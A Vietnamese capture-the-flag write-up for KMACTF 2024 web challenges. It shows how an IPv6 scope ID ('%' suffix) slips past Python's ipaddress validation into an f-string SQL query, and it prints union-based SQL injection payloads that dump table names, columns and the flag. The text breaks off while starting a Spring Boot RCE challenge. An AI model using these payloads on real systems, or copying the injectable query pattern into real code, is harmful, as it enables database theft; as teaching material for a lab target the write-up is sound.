<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="pickleball URL: 157.15.86.73:8888 Challenge chia flag thành 3 phần và giấu chúng vào trang web, mình dirsearch và tìm kiếm trong request burp 1 lúc thì tìm được: Part 1 nằm ở /robots.txt Part 2 nằm tại file js Part 3 ở file css Flag: KMACTF{p1Ckleb4ll_WitH-uU_piCklepal_5a6b89113abb} malicip Preface URL: 157.15.86.73:18000 Source Code Tại schema.sql mình thấy flag được đưa vào bảng giấu tên REDACTED_TABLE và cột giấu tên REDACTED_COLUMN, gợi ý để solve challenge cần dump database:\n"><title>KMACTF 2024 write up</title><link rel=canonical href=https://kev1n1203.github.io/p/kma-ctf-2024/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="KMACTF 2024 write up"><meta property='og:description' content="pickleball URL: 157.15.86.73:8888 Challenge chia flag thành 3 phần và giấu chúng vào trang web, mình dirsearch và tìm kiếm trong request burp 1 lúc thì tìm được: Part 1 nằm ở /robots.txt Part 2 nằm tại file js Part 3 ở file css Flag: KMACTF{p1Ckleb4ll_WitH-uU_piCklepal_5a6b89113abb} malicip Preface URL: 157.15.86.73:18000 Source Code Tại schema.sql mình thấy flag được đưa vào bảng giấu tên REDACTED_TABLE và cột giấu tên REDACTED_COLUMN, gợi ý để solve challenge cần dump database:\n"><meta property='og:url' content='https://kev1n1203.github.io/p/kma-ctf-2024/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-08-25T17:59:27+00:00'><meta property='article:modified_time' content='2024-08-25T17:59:27+00:00'><meta name=twitter:title content="KMACTF 2024 write up"><meta name=twitter:description content="pickleball URL: 157.15.86.73:8888 Challenge chia flag thành 3 phần và giấu chúng vào trang web, mình dirsearch và tìm kiếm trong request burp 1 lúc thì tìm được: Part 1 nằm ở /robots.txt Part 2 nằm tại file js Part 3 ở file css Flag: KMACTF{p1Ckleb4ll_WitH-uU_piCklepal_5a6b89113abb} malicip Preface URL: 157.15.86.73:18000 Source Code Tại schema.sql mình thấy flag được đưa vào bảng giấu tên REDACTED_TABLE và cột giấu tên REDACTED_COLUMN, gợi ý để solve challenge cần dump database:\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#pickleball>pickleball</a></li><li><a href=#malicip>malicip</a><ol><li><a href=#preface>Preface</a></li><li><a href=#source-code>Source Code</a></li><li><a href=#exploit>Exploit</a></li></ol></li><li><a href=#spring-up>spring up</a><ol><li><a href=#preface-1>Preface</a></li><li><a href=#source-code-1>Source Code</a></li><li><a href=#exploit-1>Exploit</a></li></ol></li><li><a href=#not-so-secure>not so secure</a><ol><li><a href=#bypass-jwt-es256>Bypass JWT ES256</a></li><li><a href=#from-docx-to-xxe>From docx to XXE</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/kma-ctf-2024/>KMACTF 2024 write up</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2024-08-25T17:59:27Z>Aug 25, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>16 minute read</time></div></footer></div></header><section class=article-content><h2 id=pickleball>pickleball</h2><p><br><img src=https://hackmd.io/_uploads/rynYQTui0.png loading=lazy alt=image><br></p><ul><li>URL: <a class=link href=http://157.15.86.73:8888 target=_blank rel=noopener>157.15.86.73:8888</a></li></ul><p>Challenge chia flag thành 3 phần và giấu chúng vào trang web, mình dirsearch và tìm kiếm trong request burp 1 lúc thì tìm được:
Part 1 nằm ở /robots.txt<br><img src=https://hackmd.io/_uploads/SyXuk5OoA.png loading=lazy alt=image><br>Part 2 nằm tại file js<br><img src=https://hackmd.io/_uploads/r1KYy9_sC.png loading=lazy alt=image><br>Part 3 ở file css<br><img src=https://hackmd.io/_uploads/S1yi15OiA.png loading=lazy alt=image><br></p><ul><li>Flag: <strong>KMACTF{p1Ckleb4ll_WitH-uU_piCklepal_5a6b89113abb}</strong></li></ul><h2 id=malicip>malicip</h2><h3 id=preface>Preface</h3><p><br><img src=https://hackmd.io/_uploads/rJ94UpdsC.png loading=lazy alt=image><br></p><ul><li>URL: <a class=link href=http://157.15.86.73:18000 target=_blank rel=noopener>157.15.86.73:18000</a></li></ul><h3 id=source-code>Source Code</h3><p>Tại schema.sql mình thấy flag được đưa vào bảng giấu tên REDACTED_TABLE và cột giấu tên REDACTED_COLUMN, gợi ý để solve challenge cần dump database:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>REDACTED_TABLE</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=o>`</span><span class=n>REDACTED_COLUMN</span><span class=o>`</span><span class=w> </span><span class=kt>varchar</span><span class=p>(</span><span class=mi>128</span><span class=p>)</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=no>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=o>`</span><span class=n>REDACTED_TABLE</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=o>`</span><span class=n>REDACTED_COLUMN</span><span class=o>`</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=s1>&#39;KMA{redacted, of course}&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Ngoài file app.py xử lý 3 route của trang web, file config không có cấu hình gì đặc biệt nên mình tập trung đi vào đọc file app.py. Điều đặc biệt đập vào mắt mình là route <code>check-ip</code> được truyền vào tham số URL ip dính SQL Injection:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@app.get(&#34;/check-ip&#34;)
</span></span><span class=line><span class=cl>def check_ip():
</span></span><span class=line><span class=cl>    ip = request.args.get(&#39;ip&#39;, None, ip_address)
</span></span><span class=line><span class=cl>    if ip is not None:
</span></span><span class=line><span class=cl>        result = query_db(f&#34;SELECT ip, message FROM malicious_ip WHERE ip = &#39;{ip}&#39;&#34;)
</span></span><span class=line><span class=cl>        return jsonify(
</span></span><span class=line><span class=cl>            [{&#34;ip&#34;: ip, &#34;message&#34;: message} for ip, message in result]
</span></span><span class=line><span class=cl>        )
</span></span><span class=line><span class=cl>    else:
</span></span><span class=line><span class=cl>        return &#34;invalid IP, now your IP seems suspicious&#34;, 400
</span></span></code></pre></td></tr></table></div></div><ul><li>Tham số <code>ip</code> nếu không được truyền vào sẽ mặc định là null, còn không thì được đưa vào hàm ipaddress.ip_address() để validate xem đây có phải là một IP hợp lệ hay không.</li><li>Nếu <code>ip</code> thỏa mãn sau khi hàm check ip_address thì sẽ được đưa vào câu lệnh SQL dính SQLi, còn không trả về status 400</li></ul><p>Mục đích của challenge đã khá rõ ràng, việc mình cần làm là truyền vào IP thỏa mãn hàm ipaddress.ip_address(), đồng thời vẫn phải exploit SQL Injection.
Điều này không dễ tí nào khi hàm này check khá chặt, thêm 1 dấu nháy hàm sẽ trả về exception ngay:<br><img src=https://hackmd.io/_uploads/H1D3c6uj0.png loading=lazy alt=image><br>Mình mất kha khá thời gian cho việc chèn vào được một địa chỉ IP hợp lệ mà chứa được cả dấu nháy đơn. Đi tìm kiếm các vuln của thư viện nhưng cũng không có gì sử dụng được cả
Đọc lại source code, tự nhiên mình thấy địa chỉ IPv6 được insert hàng cuối khá thú vị, vì nó vẫn có thể chứa các ký tự, mình tiếp fuzzing tiếp một số địa chỉ IPv6 như <code>abcd::dead:beef:abcd</code>, nhưng vẫn chưa thể chèn được dấu nháy vào vì chỉ có thể chèn vào các ký tự biểu diễn hex mà thôi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=o>`</span><span class=n>malicious_ip</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=o>`</span><span class=n>ip</span><span class=o>`</span><span class=p>,</span><span class=o>`</span><span class=n>message</span><span class=o>`</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>VALUES</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;13.37.13.37&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;too leet&#39;</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;103.12.104.72&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;phishing&#39;</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;42.112.213.88&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;phishing&#39;</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;2405:f980::1:12&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;phishing&#39;</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;103.12.104.29&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;command &amp; control server&#39;</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;1337::dead:beef&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;dead leet&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Lượn lờ các doc thì mình thấy có phần so sánh tại <a class=link href=https://blog.51cto.com/u_16099261/8620358 target=_blank rel=noopener>đây</a> khá thú vị khi có thể chèn giá trị đằng sau địa chỉ IPv6 bằng dấu <code>%</code><br><img src=https://hackmd.io/_uploads/HJMMe0dj0.png loading=lazy alt=image><br>Không hiểu lắm nó có tác dụng gì, mình thử chèn nhiều hơn là số 1 vào đằng sau dấu <code>%</code> thì thấy hoàn toàn valid, mình có thể truyền vào gần như bất cứ thứ gì, trong đó có cả dấu nháy:<br><img src=https://hackmd.io/_uploads/rkO2eRuj0.png loading=lazy alt=image><br>Lý do cho việc này thì ta cần phải đi đoạn code xử lý hàm <code>ipaddress.ip_address()</code>, hàm xét 2 trường hợp địa chỉ IP truyền vào hoặc là IPv4 hay IPv6. Sau đó tiến hành check bằng việc gán địa chỉ đó vào 2 class, việc kiểm tra sẽ được tiếp tục diễn ra tại phương thức <code>__init__</code> của 2 class đó:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def ip_address(address):
</span></span><span class=line><span class=cl>    try:
</span></span><span class=line><span class=cl>        return IPv4Address(address)
</span></span><span class=line><span class=cl>    except (AddressValueError, NetmaskValueError):
</span></span><span class=line><span class=cl>        pass
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    try:
</span></span><span class=line><span class=cl>        return IPv6Address(address)
</span></span><span class=line><span class=cl>    except (AddressValueError, NetmaskValueError):
</span></span><span class=line><span class=cl>        pass
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    raise ValueError(f&#39;{address!r} does not appear to be an IPv4 or IPv6 address&#39;)
</span></span></code></pre></td></tr></table></div></div><ul><li>Đi hàm method <code>__init__</code> của class IPv6Address, ta sẽ thấy địa chỉ IP được kiểm tra xem được truyền vào theo kiểu số nguyên, hay kiểu hỗn hợp, và cuối cùng là kiểu chuỗi -> kiểu mà ta truyền vào:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>def</span> <span class=nf>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>address</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># Efficient constructor from integer.</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>isinstance</span><span class=p>(</span><span class=n>address</span><span class=p>,</span> <span class=ne>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_check_int_address</span><span class=p>(</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_ip</span> <span class=o>=</span> <span class=n>address</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_scope_id</span> <span class=o>=</span> <span class=n>None</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Constructing from a packed address</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>isinstance</span><span class=p>(</span><span class=n>address</span><span class=p>,</span> <span class=n>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_check_packed_address</span><span class=p>(</span><span class=n>address</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_ip</span> <span class=o>=</span> <span class=ne>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>address</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_scope_id</span> <span class=o>=</span> <span class=n>None</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Assume input argument to be string or any object representation</span>
</span></span><span class=line><span class=cl>    <span class=c1># which converts into a formatted IP string.</span>
</span></span><span class=line><span class=cl>    <span class=n>addr_str</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;/&#39;</span> <span class=ow>in</span> <span class=n>addr_str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>raise</span> <span class=n>AddressValueError</span><span class=p>(</span><span class=n>f</span><span class=s2>&#34;Unexpected &#39;/&#39; in {address!r}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>addr_str</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>_scope_id</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_split_scope_id</span><span class=p>(</span><span class=n>addr_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>_ip</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_ip_int_from_string</span><span class=p>(</span><span class=n>addr_str</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Tiếp tục đi vào hàm <code>_split_scope_id</code>, ta sẽ thấy địa chỉ IPv6 được chia thành 3 phần thông qua method partition(&rsquo;%')<ul><li><code>addr</code> là phần đằng trước dấu %</li><li><code>sep</code> là dấu %</li><li><code>scope_id</code> là phần đằng sau dấu %</li></ul></li><li>Nếu như <code>sep</code> (hay dấu <code>%</code>) không tồn tại, mặc định phần đằng sau cũng không tồn tại, hay <code>scope_id</code> là None. Còn nếu như không tồn tại <code>scope_id</code> mà lại xuất hiện dấu <code>%</code> thì quá trình parse sẽ dính lỗi mà raise exception</li><li>Nếu vừa có sep, vừa có <code>scope_id</code> thì return 2 giá trị addr -> địa chỉ IPv6 và <code>scope_id</code>
-> phần đằng sau dấu <code>%</code></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@staticmethod
</span></span><span class=line><span class=cl>def _split_scope_id(ip_str):
</span></span><span class=line><span class=cl>    addr, sep, scope_id = ip_str.partition(&#39;%&#39;)
</span></span><span class=line><span class=cl>    if not sep:
</span></span><span class=line><span class=cl>        scope_id = None
</span></span><span class=line><span class=cl>    elif not scope_id or &#39;%&#39; in scope_id:
</span></span><span class=line><span class=cl>        raise AddressValueError(&#39;Invalid IPv6 address: &#34;%r&#34;&#39; % ip_str)
</span></span><span class=line><span class=cl>    return addr, scope_id
</span></span></code></pre></td></tr></table></div></div><ul><li>Ví dụ:<br><img src=https://hackmd.io/_uploads/HyDpzAujC.png loading=lazy alt=image><br></li><li>Sau đó addr là giá trị <code>addr_str</code>, được đưa vào hàm <code>_ip_int_from_string</code> để đưa về dạng địa chỉ, sau đó gán vào thuộc tính <code>_ip</code> của object hiện tại. Còn <code>_scope_id</code> tạm thời không được sử dụng tiếp trong method <code>__init__</code></li></ul><p>Như vậy về cơ bản thì mình có thể bypass hàm check <code>ipaddress.ip_address()</code> bằng dấu <code>%</code> đằng sau 1 địa chỉ IPv6 valid:<br><img src=https://hackmd.io/_uploads/SyJD40OiA.png loading=lazy alt=image><br><br><img src=https://hackmd.io/_uploads/HJ1OEC_oC.png loading=lazy alt=image><br></p><h3 id=exploit>Exploit</h3><p>Việc khó đã làm được, giờ mình chỉ cần exploit SQLi để dump db là sol được challenge rồi.
Lợi dụng việc route hiển thị tất cả các row của câu lệnh select thông qua vòng for, mình dùng union based để lấy thông tin luôn:
Tại local thì có select thẳng luôn vì mình đã biết tên bảng tên cột chứa flag:<br><img src=https://hackmd.io/_uploads/H1bmBCOjA.png loading=lazy alt=image><br>Còn lên server thì mình sẽ lấy thông tin về tên bảng trước bằng tên db <code>malicip</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1337::dead:beef%&#39; union select null,table_name from information_schema.tables where table_schema=&#34;malicip&#34;-- -
</span></span></code></pre></td></tr></table></div></div><p><br><img src=https://hackmd.io/_uploads/H1H2HA_i0.png loading=lazy alt=image><br>Được tên bảng là <code>______________________________________________m4LiC10u5_T413Le</code>, mình tiếp tục lấy cột và lấy flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1337::dead:beef%&#39; union select null,column_name from information_schema.columns where table_name=&#34;______________________________________________m4LiC10u5_T413Le&#34;-- -
</span></span></code></pre></td></tr></table></div></div><p><br><img src=https://hackmd.io/_uploads/Byr-LCOoR.png loading=lazy alt=image><br></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1337::dead:beef%&#39; union select null,_____________________________________________MaL1ci0uS_c0lUmnN from ______________________________________________m4LiC10u5_T413Le-- -
</span></span></code></pre></td></tr></table></div></div><p><br><img src=https://hackmd.io/_uploads/BygEUCOo0.png loading=lazy alt=image><br></p><ul><li>Flag: <strong>KMACTF{actually__this_flag-is_not_so_malicious_but_the_ipv6_is}</strong></li></ul><h2 id=spring-up>spring up</h2><h3 id=preface-1>Preface</h3><p><br><img src=https://hackmd.io/_uploads/HJasIAuiR.png loading=lazy alt=image><br>Đây là một challenge Java Spring boot mà động đến kiến thức mà mình chưa từng tìm hiểu, cho nên quá trình searching để tìm ra đúng lỗ hổng là rất lâu, sau đó mình cũng ngốn tiếp hơn 2 tiếng để build file exploit nên mình solve challenge này khi cuộc thi chỉ còn 1 tiếng, ngần đấy không đủ thời gian để tìm ra hướng cho bài web cuối cùng.</p><h3 id=source-code-1>Source Code</h3><p>Đầu tiên xem xét Dockerfile, ta thấy flag được move với ký hiệu ngẫu nhiên, gợi ý cho việc để solve challenge ta cần phải RCE:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>COPY flag.txt /flag.txt
</span></span><span class=line><span class=cl>RUN mv /flag.txt /flag_$(cat /dev/urandom | tr -dc &#39;a-zA-Z0-9&#39; | fold -w 32 | head -n 1).txt
</span></span></code></pre></td></tr></table></div></div><p>Tiếp tục đến docker compose, service spring boot đứng sau 1 con reversed proxy nginx, với việc service backend phía sau để no-internet khẳng định không có outbound ra ngoài, loại bỏ trường hợp sử dụng curl/wget hay reverse shell khi RCE:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
